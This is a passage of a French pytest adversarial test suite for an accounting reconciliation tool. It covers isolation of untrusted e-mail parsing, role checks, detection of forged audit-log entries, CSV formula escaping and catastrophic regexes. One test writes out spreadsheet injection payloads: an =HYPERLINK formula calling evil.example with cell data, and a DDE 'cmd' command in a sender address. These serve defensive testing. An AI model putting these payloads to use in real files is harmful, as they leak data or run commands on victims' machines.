                with open(f"/proc/{d}/stat", "rb") as f:
                    champs = f.read().rsplit(b")", 1)[1].split()
                if int(champs[1]) == moi:
                    trouves.append(int(d))
            except (OSError, IndexError, ValueError):
                pass
    return trouves


def test_sain_isolation_gros_messages_legitimes_passent(entree, inst) -> None:
    """Pas d'interblocage du tube : 24 Mio (piece de 18 Mio) et 200 pieces de 100 Kio."""
    (inst.entrant / "1.eml").write_bytes(eml("compta@alpha-sarl.fr", "<g@x>", objet="facture 120,00 EUR",
                                             fichiers=(("f_2026-09.pdf", _os.urandom(18 * 1024 * 1024)),)))
    (inst.entrant / "2.eml").write_bytes(eml("contact@beta-sas.fr", "<h@x>", objet="releve",
                                             fichiers=tuple((f"f{i}.pdf", _os.urandom(100 * 1024))
                                                            for i in range(200))))
    assert (inst.entrant / "1.eml").stat().st_size > 20 * 1024 * 1024
    t = time.perf_counter()
    r = lancer(entree, inst, J0)
    assert time.perf_counter() - t < 13           # bien avant le delai de garde
    assert r.quarantaine == 0 and r.messages_lus == 2
    assert r.propositions == 1 and r.non_routees == 200


def test_sain_isolation_mille_fichiers_sans_fuite(entree, inst) -> None:
    for i in range(1000):
        brut = _imbrique(1000) if i % 10 == 0 else eml("x@inconnu.fr", f"<{i}@x>", fichiers=((f"f{i}.pdf", b"%"),))
        (inst.entrant / f"{i:04d}.eml").write_bytes(brut)
    fd_avant = len(_os.listdir("/proc/self/fd"))
    r = lancer(entree, inst, J0)
    assert (r.quarantaine, r.messages_lus) == (100, 900)
    assert len(_os.listdir("/proc/self/fd")) == fd_avant
    assert _enfants_vivants() == []
    with sqlite3.connect(inst.depot) as c:
        assert c.execute("PRAGMA integrity_check").fetchone() == ("ok",)


def _espion(monkeypatch, comportement):
    """Remplace `routage.lire_eml` (herite par fork) : l'enfant ecrit son PID puis agit."""
    vrai = routage.lire_eml

    def faux(chemin):
        with open(str(chemin) + ".pid", "w") as f:
            f.write(str(_os.getpid()))
        comportement(chemin)
        return vrai(chemin)

    monkeypatch.setattr(routage, "lire_eml", faux)


def _boucle_sourde(chemin) -> None:
    _signal.signal(_signal.SIGXCPU, _signal.SIG_IGN)
    while True:
        pass


def _bloque(chemin) -> None:
    _signal.signal(_signal.SIGXCPU, _signal.SIG_IGN)
    time.sleep(3600)


@pytest.mark.parametrize("comportement", [_boucle_sourde, _bloque], ids=["ignore_SIGXCPU", "bloque"])
def test_sain_isolation_enfant_tue_sans_survivant(entree, tmp_path, monkeypatch, comportement) -> None:
    inst = nouvelle_instance(tmp_path / "i")
    (inst.racine / "parking").mkdir()
    (inst.entrant / "1.eml").write_bytes(eml("compta@alpha-sarl.fr", "<a@x>", fichiers=(("f.pdf", b"%"),)))
    _espion(monkeypatch, comportement)
    t = time.perf_counter()
    r = cycle.executer_cycle(entree, inst, J0, a(J0), limite_cpu_eml=1)
    assert time.perf_counter() - t < 10
    assert r.quarantaine == 1
    pid = int((inst.entrant / "1.eml.pid").read_text())
    assert not _os.path.exists(f"/proc/{pid}") and _enfants_vivants() == []
    raison = cellules(inst.sortie / "quarantaine.csv")[2]
    assert "SIGKILL" in raison or "plus de" in raison, raison


def test_sain_isolation_aucune_transaction_ni_verrou_tenus_au_fork(entree, inst, monkeypatch) -> None:
    """Au moment de chaque fork, ni la base (BEGIN IMMEDIATE) ni le journal (flock) ne sont
    verrouilles par le parent : l'enfant ne peut ni bloquer ni heriter d'un verrou."""
    import fcntl
    for i in range(3):
        (inst.entrant / f"{i}.eml").write_bytes(eml("compta@alpha-sarl.fr", f"<{i}@x>",
                                                    fichiers=(("f.pdf", b"%"),)))
    vrai = cycle._lire_eml_isole
    constats = []

    def controle(chemin, *args, **kw):
        c = sqlite3.connect(inst.depot, timeout=0)
        try:
            c.execute("BEGIN IMMEDIATE")
            c.execute("ROLLBACK")
            base_libre = True
        except sqlite3.OperationalError:
            base_libre = False
        finally:
            c.close()
        with open(inst.audit, "ab") as f:
            try:
                fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
                journal_libre = True
            except OSError:
                journal_libre = False
        constats.append((base_libre, journal_libre))
        return vrai(chemin, *args, **kw)

    monkeypatch.setattr(cycle, "_lire_eml_isole", controle)
    lancer(entree, inst, J0)
    assert constats == [(True, True)] * 3


@pytest.mark.xfail(strict=True, reason=(
    "LIMITE ASSUMEE (docs/architecture_mvp.md section 7). "
    "L'enfant qui analyse un .eml non fiable herite des descripteurs ouverts du parent, dont "
    "celui de depot.sqlite (et de son -wal) en ecriture : rien ne les ferme avant l'analyse "
    "(defense en profondeur ; une faille d'execution de code dans l'analyseur atteindrait la "
    "base de tous les clients)."))
def test_defaut_isolation_enfant_herite_du_descripteur_de_la_base(entree, inst, monkeypatch) -> None:
    (inst.entrant / "1.eml").write_bytes(eml("compta@alpha-sarl.fr", "<a@x>", fichiers=(("f.pdf", b"%"),)))

    def inventaire(chemin) -> None:
        cibles = []
        for fd in _os.listdir("/proc/self/fd"):
            try:
                cibles.append(_os.readlink(f"/proc/self/fd/{fd}"))
            except OSError:
                pass
        with open(str(chemin) + ".fds", "w") as f:
            f.write("\n".join(cibles))

    _espion(monkeypatch, inventaire)
    lancer(entree, inst, J0)
    cibles = (inst.entrant / "1.eml.fds").read_text().splitlines()
    assert not [c for c in cibles if "depot.sqlite" in c or "audit.jsonl" in c], cibles


@pytest.mark.xfail(strict=True, reason=(
    "LIMITE ASSUMEE (docs/architecture_mvp.md section 7). "
    "Sous `ulimit -v` (RLIMIT_AS dur pose par l'hebergeur ou le cron), si la marge restante est "
    "inferieure a la limite de l'enfant (1 Gio), `setrlimit` echoue ('not allowed to raise "
    "maximum limit') et TOUT e-mail legitime part en quarantaine. Le plafond devrait etre "
    "min(plafond voulu, limite dure)."))
def test_defaut_isolation_ulimit_v_met_tout_en_quarantaine(tmp_path) -> None:
    script = tmp_path / "s.py"
    script.write_text(
        "import os, resource, sys\n"
        f"sys.path.insert(0, {str(RACINE / 'tests')!r}); sys.path.insert(0, {str(RACINE / 'src')!r})\n"
        "import test_adversarial as T\n"
        "from pathlib import Path\n"
        f"racine = Path({str(tmp_path)!r})\n"
        "e = T.ecrire_entree(racine / 'e'); inst = T.nouvelle_instance(racine / 'i')\n"
        "(inst.entrant / '1.eml').write_bytes(T.eml('compta@alpha-sarl.fr', '<g@x>', "
        "objet='facture 120,00 EUR', fichiers=(('f_2026-09.pdf', b'%PDF'),)))\n"
        "vsz = int(open('/proc/self/statm').read().split()[0]) * os.sysconf('SC_PAGE_SIZE')\n"
        "dur = vsz + 400 * 1024 * 1024\n"
        "resource.setrlimit(resource.RLIMIT_AS, (dur, dur))\n"
        "r = T.lancer(e, inst, T.J0)\n"
        "print(r.quarantaine, r.propositions)\n", encoding="utf-8")
    sortie = subprocess.run([sys.executable, str(script)], capture_output=True, text=True, check=True).stdout
    assert sortie.split() == ["0", "1"], sortie


def test_sain_isolation_parent_deja_gros(entree, inst) -> None:
    lest = bytearray(500 * 1024 * 1024)
    lest[::4096] = b"\x01" * len(range(0, len(lest), 4096))
    (inst.entrant / "1.eml").write_bytes(eml("compta@alpha-sarl.fr", "<g@x>", objet="facture 120,00 EUR",
                                             fichiers=(("f_2026-09.pdf", _os.urandom(10 * 1024 * 1024)),)))
    r = lancer(entree, inst, J0)
    del lest
    assert (r.quarantaine, r.propositions) == (0, 1)


def test_sain_isolation_indisponible_refus_avant_toute_ecriture(entree, tmp_path, monkeypatch, capsys) -> None:
    monkeypatch.setattr(cycle, "resource", None)
    racine = tmp_path / "jamais"
    with pytest.raises(cycle.IsolationIndisponible):
        cycle.executer_cycle(entree, racine, J0, a(J0))
    assert not racine.exists()
    assert charger_cli().main(["cycle", "--entree", str(entree), "--instance", str(racine),
                               "--date", J0.isoformat()]) == 1
    assert "IsolationIndisponible" in capsys.readouterr().err and not racine.exists()
    monkeypatch.undo()
    monkeypatch.setattr(cycle.multiprocessing, "get_all_start_methods", lambda: ["spawn"])
    with pytest.raises(cycle.IsolationIndisponible):
        cycle.executer_cycle(entree, racine, J0, a(J0))
    assert not racine.exists()


def test_sain_isolation_deterministe_avec_quarantaine(tmp_path) -> None:
    entree = ecrire_entree(tmp_path / "e")
    messages = {"0-bombe.eml": _imbrique(1000),
                "1.eml": eml("compta@alpha-sarl.fr", "<1@x>", objet="120,00 EUR", fichiers=(("f_2026-09.pdf", b"%"),)),
                "2-gros.eml": b"From: " + b"=?utf-8?q?a?= " * 6000 + b"<a@b.fr>\r\n\r\nx\r\n",
                "3.eml": eml("x@gmail.com", "<3@x>", fichiers=(("b.pdf", b"%"),))}
    empreintes_sorties = []
    for i in range(2):
        inst = nouvelle_instance(tmp_path / f"i{i}")
        for nom in (sorted(messages) if i == 0 else sorted(messages, reverse=True)):
            (inst.entrant / nom).write_bytes(messages[nom])
        lancer(entree, inst, J0)
        empreintes_sorties.append(_empreintes(inst.sortie))
    assert empreintes_sorties[0] == empreintes_sorties[1]


# ===========================================================================
# 10. Quatrieme passage : conformite (A1 a A18)
# ===========================================================================

import dataclasses as _dc  # noqa: E402
import json as _json  # noqa: E402

from rapprochement import etats as _etats  # noqa: E402
from rapprochement.audit import JournalAudit as _Journal  # noqa: E402
from rapprochement.exclusions import Referentiel  # noqa: E402
from rapprochement.modeles import DecisionRoutage  # noqa: E402
from rapprochement.parseurs import lire_dossiers, lire_pieces, lire_releve  # noqa: E402


@pytest.fixture
def inst_r(tmp_path: Path) -> cycle.Instance:
    """Instance de production avec un responsable declare (A14)."""
    return avec_responsable(nouvelle_instance(tmp_path / "instance_r"))


def _ou_none(appel):
    """Resultat de `appel()`, ou None si l'appel est refuse par le cycle (refus propre)."""
    try:
        return appel()
    except (cycle.ErreurCycle, envoi.EnvoiNonValide, _etats.TransitionInterdite):
        return None


def _file_alpha(entree: Path, inst: cycle.Instance) -> DecisionRoutage:
    (inst.entrant / "1.eml").write_bytes(eml(
        "compta@alpha-sarl.fr", "<m1@x>", objet="facture 120,00 EUR",
        fichiers=(("f_2026-09.pdf", b"%PDF A"),)))
    lancer(entree, inst, J0)
    [d] = cycle.lister_file(inst)
    assert (d.statut, d.dossier, d.reference_operation) == (StatutRoutage.PROPOSEE, "ALPHA", "A-001")
    return d


def _pieces(inst: cycle.Instance) -> dict[str, PieceAttendue]:
    return {p.reference: p for p in cycle.pieces(inst)}


# --- A7 : CA-03, jamais de rattachement inter-dossiers --------------------


def test_sain_a7_forcer_exige_un_motif_reel_et_laisse_une_trace(entree, inst_r) -> None:
    d = _file_alpha(entree, inst_r)
    for par, kw in ((RESPONSABLE, dict(forcer=True)), (RESPONSABLE, dict(forcer=True, motif="")),
                    (RESPONSABLE, dict(forcer=True, motif=" \t\n ")), (VALIDEUSE, dict())):
        with pytest.raises(cycle.ErreurCycle):
            cycle.rattacher_piece(inst_r, par, maintenant=a(J0), message_id=d.message_id,
                                  dossier="BETA", reference="B-001", **kw)
    assert _pieces(inst_r)["B-001"].etat is EtatPiece.ATTENDUE and _pieces(inst_r)["B-001"].pieces_rattachees == ()
    assert len(cycle.lister_file(inst_r)) == 1                       # toujours a traiter
    actions = [e.action for e in _Journal(inst_r.audit).lire()]
    assert "rattachement_refuse" in actions and "rattachement_force" not in actions
    # Avec un motif : la piece de BETA change, pas celle d'ALPHA ; trace complete.
    p = cycle.rattacher_piece(inst_r, RESPONSABLE, maintenant=a(J0), message_id=d.message_id, dossier="BETA",
                              reference="B-001", forcer=True, motif="  erreur de dossier cote client  ")
    assert (p.dossier, p.etat) == ("BETA", EtatPiece.RECUE)
    assert _pieces(inst_r)["A-001"].etat is EtatPiece.ATTENDUE
    [force] = [e for e in _Journal(inst_r.audit).lire() if e.action == "rattachement_force"]
    assert force.acteur == RESPONSABLE
    assert (force.details["dossier_origine"], force.details["dossier_cible"]) == ("ALPHA", "BETA")
    assert force.details["motif"] == "erreur de dossier cote client"
    assert cycle.lister_file(inst_r) == []


def test_sain_a7_cli_forcer_et_motif_vont_ensemble(entree, inst_r) -> None:
    d = _file_alpha(entree, inst_r)
    cli = charger_cli()
    base = ["--instance", str(inst_r.racine), "--date", J0.isoformat()]
    cible = ["rattacher", "--message-id", d.message_id, "--dossier", "BETA", "--reference", "B-001",
             "--par", RESPONSABLE, *base]
    assert cli.main(cible) == 1                                      # sans --forcer
    assert cli.main([*cible, "--forcer"]) == 1                       # sans motif
    assert cli.main([*cible, "--forcer", "--motif", " "]) == 1       # motif d'espaces
    assert cli.main([*cible, "--motif", "x"]) == 1                   # motif sans --forcer
    assert _pieces(inst_r)["B-001"].etat is EtatPiece.ATTENDUE


@pytest.mark.parametrize("variante", ["alpha", "ALPHA ", " ALPHA", "ＡＬＰＨＡ", "ALPHA​", "ALРHA"])
def test_sain_a7_variantes_du_dossier_ne_passent_pas(entree, inst_r, variante) -> None:
    """Casse, espaces, pleine chasse, zero-width, homoglyphe : jamais d'effet, forcer ou non."""
    d = _file_alpha(entree, inst_r)
    avant = cycle.pieces(inst_r)
    for par, kw in ((VALIDEUSE, dict()), (RESPONSABLE, dict(forcer=True, motif="essai"))):
        with pytest.raises(cycle.ErreurCycle):
            cycle.rattacher_piece(inst_r, par, maintenant=a(J0), message_id=d.message_id,
                                  dossier=variante, reference="A-001", **kw)
    assert cycle.pieces(inst_r) == avant and len(cycle.lister_file(inst_r)) == 1


def test_regression_a7_meme_id_piece_rattachee_a_deux_dossiers(entree, inst_r) -> None:
    lancer(entree, inst_r, J0)
    cycle.rattacher_piece(inst_r, VALIDEUSE, maintenant=a(J0), dossier="ALPHA", reference="A-001",
                          id_piece="facture.pdf#abc123def456")
    refuse = _ou_none(lambda: cycle.rattacher_piece(
        inst_r, VALIDEUSE, maintenant=a(J0), dossier="BETA", reference="B-001",
        id_piece="facture.pdf#abc123def456")) is None
    assert refuse


def test_regression_a7_forcer_reserve_au_responsable(entree, inst_r) -> None:
    """Un simple validateur ne force pas : refus AVANT toute ecriture, quel que soit le motif,
    drapeau du mode test compris (`responsables.txt` present : pas de repli)."""
    d = _file_alpha(entree, inst_r)
    avant = (etat_brut(inst_r), inst_r.audit.read_bytes())
    for drapeau in (False, True):
        # Drapeau `mode_test` sur une instance REELLE : le mode fige refuse avant meme le role.
        attendu = cycle.ModeInstanceIncompatible if drapeau else cycle.ValidateurRefuse
        for motif in ("x", "erreur de dossier cote client", ""):
            with pytest.raises(attendu):
                cycle.rattacher_piece(inst_r, VALIDEUSE, maintenant=a(J0), message_id=d.message_id,
                                      dossier="BETA", reference="B-001", forcer=True, motif=motif,
                                      mode_test=drapeau)
    assert (etat_brut(inst_r), inst_r.audit.read_bytes()) == avant
    cli = charger_cli()
    base = ["--instance", str(inst_r.racine), "--date", J0.isoformat()]
    assert cli.main(["rattacher", "--message-id", d.message_id, "--dossier", "BETA", "--reference", "B-001",
                     "--par", VALIDEUSE, "--forcer", "--motif", "x", *base]) == 1
    assert (etat_brut(inst_r), inst_r.audit.read_bytes()) == avant
    # Le rattachement normal (meme dossier) reste ouvert aux validateurs.
    p = cycle.rattacher_piece(inst_r, VALIDEUSE, maintenant=a(J0), message_id=d.message_id)
    assert (p.dossier, p.reference, p.etat) == ("ALPHA", "A-001", EtatPiece.RECUE)


# --- A14 : roles ------------------------------------------------------------


def test_sain_a14_responsables_lecture_et_refus(entree, tmp_path) -> None:
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    inst.responsables.write_bytes("﻿# equipe\r\n\r\nClaire Roux\r\n".encode("utf-8"))
    assert cycle.exiger_responsable(inst, "  CLAIRE roux ") == "Claire Roux"
    for nom in (VALIDEUSE, "Mallory", "", "   ", None, "# equipe", "systeme", "Claire  Roux", "Claire Roux"):
        with pytest.raises(cycle.ValidateurRefuse):
            cycle.exiger_responsable(inst, nom)
    avant = (etat_brut(inst), inst.audit.read_bytes())
    # Fonctions appelees directement (pas par la CLI), meme avec le drapeau du mode test :
    # `responsables.txt` PRESENT, le repli n'existe pas.
    for drapeau in (False, True):
        attendu = cycle.ModeInstanceIncompatible if drapeau else cycle.ValidateurRefuse   # instance REELLE
        with pytest.raises(attendu):
            cycle.trancher_envoi(inst, b.id_relance, VALIDEUSE, parti=True, maintenant=a(J0), mode_test=drapeau)
        with pytest.raises(attendu):
            cycle.arbitrer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="m", maintenant=a(J0), mode_test=drapeau)
        with pytest.raises(attendu):
            cycle.reparer_audit(inst, VALIDEUSE, maintenant=a(J0), mode_test=drapeau)
    assert (etat_brut(inst), inst.audit.read_bytes()) == avant
    # Instance de TEST (une instance par mode) : `responsables.txt` present, un validateur ne
    # franchit pas le role non plus, drapeau ou pas.
    inst_t = avec_responsable(nouvelle_instance(tmp_path / "instance_test"))
    cycle.executer_cycle(entree, inst_t, J0, a(J0), mode_test=True)
    bt = brouillon_de(inst_t, "compta@alpha-sarl.fr")
    for drapeau in (False, True):
        with pytest.raises((cycle.ValidateurRefuse, cycle.ModeInstanceIncompatible)):
            cycle.trancher_envoi(inst_t, bt.id_relance, VALIDEUSE, parti=True, maintenant=a(J0), mode_test=drapeau)
        with pytest.raises((cycle.ValidateurRefuse, cycle.ModeInstanceIncompatible)):
            cycle.arbitrer_piece(inst_t, "ALPHA", "A-001", VALIDEUSE, motif="m", maintenant=a(J0), mode_test=drapeau)
    # Vide, repertoire, absent (hors mode test) : refus, jamais d'acceptation par defaut.
    inst.responsables.write_bytes(b"# personne\n")
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.exiger_responsable(inst, "Claire Roux")
    inst.responsables.unlink()
    inst.responsables.mkdir()
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.exiger_responsable(inst, "Claire Roux")
    inst.responsables.rmdir()
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.exiger_responsable(inst, VALIDEUSE)
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.trancher_envoi(inst, b.id_relance, VALIDEUSE, parti=True, maintenant=a(J0))


def test_regression_a14_repli_des_roles_par_simple_drapeau_cli(entree, inst, capsys) -> None:
    lancer(entree, inst, J0)
    with open(inst.audit, "ab") as f:
        f.write(b'{"acteur":"systeme","action":"pie')
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cli.main(["reparer-audit", "--par", VALIDEUSE, *base]) == 1             # sans le drapeau : refus
    assert cli.main(["reparer-audit", "--par", VALIDEUSE, "--mode-test", *base]) == 1


def test_regression_a14_noms_nfc_nfd(tmp_path) -> None:
    inst = nouvelle_instance(tmp_path / "i", None)
    inst.validateurs.write_bytes(unicodedata.normalize("NFD", "Hélène Roux\n").encode("utf-8"))
    assert _ou_none(lambda: cycle.exiger_validateur(inst, unicodedata.normalize("NFC", "Hélène Roux"))) is not None


# --- A17 : controler-envois --------------------------------------------------


def _envoi_legitime(tmp_path: Path):
    entree = ecrire_entree(tmp_path / "e")
    inst = avec_responsable(nouvelle_instance(tmp_path / "i"))
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0), par=VALIDEUSE)
    return inst, b


def _forge(inst: cycle.Instance, acteur: str, action: str, objet: str, **details) -> None:
    """Entree correctement CHAINEE (le chainage n'est pas une preuve d'authenticite)."""
    _Journal(inst.audit).ecrire(acteur, action, objet, details, horodatage=a(J0))


def _forge_valide(inst, objet, par=VALIDEUSE, dest="x@client.fr", acteur=None):
    _forge(inst, acteur or par, "valide", objet, par=par, destinataire=dest, niveau=1)


def _forge_envoi(inst, objet, valide_par=VALIDEUSE, dest="x@client.fr", **plus):
    _forge(inst, "systeme", "envoi_effectue", objet, valide_par=valide_par, destinataire=dest,
           envoye_par=plus.pop("envoye_par", valide_par), **plus)


def test_sain_a17_controler_envois_envoi_legitime(tmp_path) -> None:
    inst, _ = _envoi_legitime(tmp_path)
    cli = charger_cli()
    assert cli.main(["controler-envois", "--instance", str(inst.racine)]) == 0
    c = cycle.controler_envois(inst)
    assert c.ok and [l.valide_par for l in c.lignes] == [VALIDEUSE]


def _sans_valide(inst, b):
    _forge_envoi(inst, "FORGE1")


def _valide_apres(inst, b):
    _forge_envoi(inst, "FORGE2")
    _forge_valide(inst, "FORGE2")


def _valide_inconnu(inst, b):
    _forge_valide(inst, "FORGE3", par="Mallory")
    _forge_envoi(inst, "FORGE3", valide_par="Mallory")


def _destinataire_different(inst, b):
    _forge_valide(inst, "FORGE4", dest="a@client.fr")
    _forge_envoi(inst, "FORGE4", dest="b@client.fr")


def _deux_envois(inst, b):
    _forge_envoi(inst, b.id_relance, dest=b.destinataire)


def _valide_par_different(inst, b):
    _forge_valide(inst, "FORGE5", par="Paul Martin")
    _forge_envoi(inst, "FORGE5", valide_par=VALIDEUSE)


def _declencheur_inconnu(inst, b):
    _forge_valide(inst, "FORGE6")
    _forge_envoi(inst, "FORGE6", envoye_par="Mallory")


def _acteur_different(inst, b):
    _forge_valide(inst, "FORGE7", par="Paul Martin", acteur="Mallory")
    _forge_envoi(inst, "FORGE7", valide_par="Paul Martin")


def _nom_retire(inst, b):
    inst.validateurs.write_text("Paul Martin\n", encoding="utf-8")


def _chaine_alteree(inst, b):
    inst.audit.write_bytes(inst.audit.read_bytes().replace(b'"envoi_effectue"', b'"envoi_effectuE"', 1))


def _journal_absent(inst, b):
    inst.audit.unlink()


@pytest.mark.parametrize("falsification", [
    _sans_valide, _valide_apres, _valide_inconnu, _destinataire_different, _deux_envois,
    _valide_par_different, _declencheur_inconnu, _acteur_different, _nom_retire, _chaine_alteree,
    _journal_absent,
], ids=lambda f: f.__name__.strip("_"))
def test_sain_a17_controler_envois_sort_non_nul(tmp_path, falsification) -> None:
    inst, b = _envoi_legitime(tmp_path)
    falsification(inst, b)
    assert charger_cli().main(["controler-envois", "--instance", str(inst.racine)]) == 1


def test_regression_a17_eml_dans_outbox_sans_trace_au_journal(entree, inst_r) -> None:
    lancer(entree, inst_r, J0)
    b = brouillon_de(inst_r, "compta@alpha-sarl.fr")
    envoi.ExpediteurDossier(inst_r.outbox).envoyer(
        _dc.replace(b, statut=StatutBrouillon.EN_COURS, valide_par=VALIDEUSE))
    assert len(list(inst_r.outbox.glob("*.eml"))) == 1
    assert not cycle.controler_envois(inst_r).ok


def test_regression_a17_envoyee_en_base_sans_journal(entree, inst_r) -> None:
    lancer(entree, inst_r, J0)
    b = brouillon_de(inst_r, "compta@alpha-sarl.fr")
    with Depot(inst_r.depot) as d:
        d.maj_brouillon(_dc.replace(b, statut=StatutBrouillon.VALIDEE, valide_par="Mallory", valide_le=a(J0)))
        d.maj_brouillon(_dc.replace(b, statut=StatutBrouillon.EN_COURS, valide_par="Mallory", valide_le=a(J0)))
        d.maj_brouillon(_dc.replace(b, statut=StatutBrouillon.ENVOYEE, valide_par="Mallory", valide_le=a(J0),
                                    envoye_le=a(J0)))
    assert [x.statut for x in cycle.brouillons(inst_r) if x.id_relance == b.id_relance] == [StatutBrouillon.ENVOYEE]
    assert not cycle.controler_envois(inst_r).ok


def test_regression_a17_paire_forgee_pour_un_brouillon_inexistant(tmp_path) -> None:
    inst, _ = _envoi_legitime(tmp_path)
    _forge_valide(inst, "FORGE1")
    _forge_envoi(inst, "FORGE1")
    assert not cycle.controler_envois(inst).ok


def test_regression_a17_brouillon_rejete_puis_envoye(entree, inst_r) -> None:
    lancer(entree, inst_r, J0)
    b = brouillon_de(inst_r, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst_r, b.id_relance, VALIDEUSE, maintenant=a(J0))
    cycle.rejeter_relance(inst_r, b.id_relance, VALIDEUSE, "non", maintenant=a(J0))
    _forge_envoi(inst_r, b.id_relance, dest=b.destinataire)
    assert not cycle.controler_envois(inst_r).ok


def test_regression_a17_envoi_sans_declencheur_nominatif_passe_la_recette(entree, inst_r) -> None:
    lancer(entree, inst_r, J0)
    b = brouillon_de(inst_r, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst_r, b.id_relance, VALIDEUSE, maintenant=a(J0))
    cycle.envoyer_relance(inst_r, b.id_relance, maintenant=a(J0))
    assert not cycle.controler_envois(inst_r).ok


# --- A8 : contexte de la file humaine ----------------------------------------


@pytest.mark.parametrize("detail", [
    "texte simple", "", "123", "null", "[1,2]", '["a"]', "true", '{"raison": 5}', '{"raison": ["x"]}',
    '{"expediteur": "a@b"}', "{", '{"raison": "r", "expediteur": ["a"], "objet": {"x": 1}, "recu_le": 1.5}',
    "\x1b[2J", "NaN", '{"raison": "r", "recu_le": 1e999}', None, '{"a": ' * 50,
])
def test_sain_a8_contexte_file_tolere_tout_detail(detail) -> None:
    d = DecisionRoutage("m", "f.pdf", "e" * 64, StatutRoutage.NON_ROUTEE, detail=detail)
    c = cycle.contexte_file(d)
    assert isinstance(c["raison"], str) and all(isinstance(v, str) for v in c.values())


def test_sain_a8_origine_du_message_dans_file_et_csv_sans_formule(entree, inst) -> None:
    brut = eml("inconnu@evil.example", "=1+1", objet='=HYPERLINK("http://evil.example/?x="&A2)',
               fichiers=(("f.pdf", b"%PDF"),))
    (inst.entrant / "1.eml").write_bytes(brut)
    (inst.entrant / "2.eml").write_bytes(eml("+cmd|'/C calc'!A0@evil.example", "<2@x>", objet="@SUM(1)",
                                             fichiers=(("g.pdf", b"%PDF2"),)))
    lancer(entree, inst, J0)
    cel = cellules(inst.sortie / "file_humaine.csv")
    assert not [c for c in cel if c.startswith(CARACTERES_FORMULE)]
    assert any(c.startswith("'=HYPERLINK") for c in cel) and "'=1+1" in cel
    contextes = [cycle.contexte_file(d) for d in cycle.lister_file(inst)]
    assert all("expediteur" in c and "recu_le" in c for c in contextes)


# --- A3 : regles d'exclusion tracees ------------------------------------------


def _csv_exclusions(chemin: Path, lignes, entetes=("dossier", "motif_regex", "motif", "nom", "auteur",
                                                    "date_activation", "statut")) -> Path:
    with open(chemin, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(entetes)
        w.writerows(lignes)
    return chemin


OPERATION_LOXAM = OperationBancaire("R1", "ALPHA", dt.date(2026, 9, 3), "CB LOXAM LOCATION",
                                    Decimal("120.00"), Sens.DEBIT)


@pytest.mark.parametrize("statut", ["proposee", "Proposee", " PROPOSEE ", "PROPOSEE", "\tproposee"])
def test_sain_a3_regle_proposee_ne_s_applique_jamais(tmp_path, statut) -> None:
    ref = Referentiel.depuis_csv(_csv_exclusions(tmp_path / "x.csv", [["ALPHA", "loxam", "m", "r1", "Paul", "2026-10-01", statut]]))
    assert ref.exclure(OPERATION_LOXAM)[0] is False and len(ref.provisoires) == 1


@pytest.mark.parametrize("statut", ["propose", "provisoire", "pending", "non", "oui", "1", "validée", "validee;"])
def test_sain_a3_statut_inconnu_refuse_avec_la_ligne(tmp_path, statut) -> None:
    with pytest.raises(ErreurFormat, match="ligne 2"):
        Referentiel.depuis_csv(_csv_exclusions(tmp_path / "x.csv", [["ALPHA", "loxam", "m", "r1", "P", "d", statut]]))


def test_sain_a3_regle_proposee_cycle_complet_la_piece_reste_reclamee(tmp_path) -> None:
    entree = ecrire_entree(tmp_path / "e", operations=[OPERATIONS[0]])
    _csv_exclusions(entree / "exclusions_dossier.csv", [["ALPHA", "loxam", "m", "r1", "Paul", "2026-10-01", "proposee"]])
    inst = nouvelle_instance(tmp_path / "i")
    r = lancer(entree, inst, J0)
    assert (r.pieces_exclues, r.brouillons_crees) == (0, 1)
    assert "r1" in cellules(inst.sortie / "regles_provisoires.csv")


@pytest.mark.parametrize("entete", ["Statut", "STATUT", "statut ", "status", "etat"])
def test_regression_a3_colonne_statut_mal_nommee(tmp_path, entete) -> None:
    chemin = _csv_exclusions(tmp_path / "x.csv", [["ALPHA", "loxam", "m", "proposee"]],
                             entetes=("dossier", "motif_regex", "motif", entete))
    try:
        ref = Referentiel.depuis_csv(chemin)
    except ErreurFormat:
        return                                                       # refus lisible : acceptable
    assert ref.exclure(OPERATION_LOXAM)[0] is False


def test_regression_a3_statut_vide_vaut_validee(tmp_path) -> None:
    chemin = _csv_exclusions(tmp_path / "x.csv", [["ALPHA", "loxam", "m", "r1", "Paul", "2026-10-01", ""]])
    try:
        ref = Referentiel.depuis_csv(chemin)
    except ErreurFormat:
        return
    assert ref.exclure(OPERATION_LOXAM)[0] is False


_SCRIPT_REGEX = """
import sys, datetime as dt
from decimal import Decimal
sys.path.insert(0, {src!r})
from rapprochement.exclusions import Referentiel
from rapprochement.modeles import OperationBancaire, Sens
ref = Referentiel.depuis_csv({csv!r})
op = OperationBancaire('R', 'ALPHA', dt.date(2026, 9, 3), 'VIR ' + 'a' * 30 + 'b', Decimal('10.00'), Sens.DEBIT)
print(ref.exclure(op)[0])
"""


def _regex_gele(tmp_path: Path, statut: str, delai: float) -> bool:
    chemin = _csv_exclusions(tmp_path / "x.csv", [["ALPHA", "(a+)+$", "m", "r1", "Paul", "2026-10-01", statut]])
    try:
        sortie = subprocess.run([sys.executable, "-c", _SCRIPT_REGEX.format(src=str(RACINE / "src"), csv=str(chemin))],
                                capture_output=True, text=True, timeout=delai)
    except subprocess.TimeoutExpired:
        return True
    assert sortie.returncode == 0 or "ErreurFormat" in sortie.stderr, sortie.stderr   # refus lisible, pas un crash
    return False


def test_sain_a3_regex_catastrophique_proposee_n_est_jamais_executee(tmp_path) -> None:
    assert not _regex_gele(tmp_path, "proposee", 20)


def test_regression_a3_regex_validee_catastrophique_gele_le_cycle(tmp_path) -> None:
    assert not _regex_gele(tmp_path, "validee", 6)


# --- A1, D6 : circuit obligatoire ---------------------------------------------


@pytest.mark.parametrize("variante", ["cellule_vide", "colonne_absente", "espaces"])
def test_sain_a1_circuit_obligatoire_en_production(tmp_path, capsys, variante) -> None:
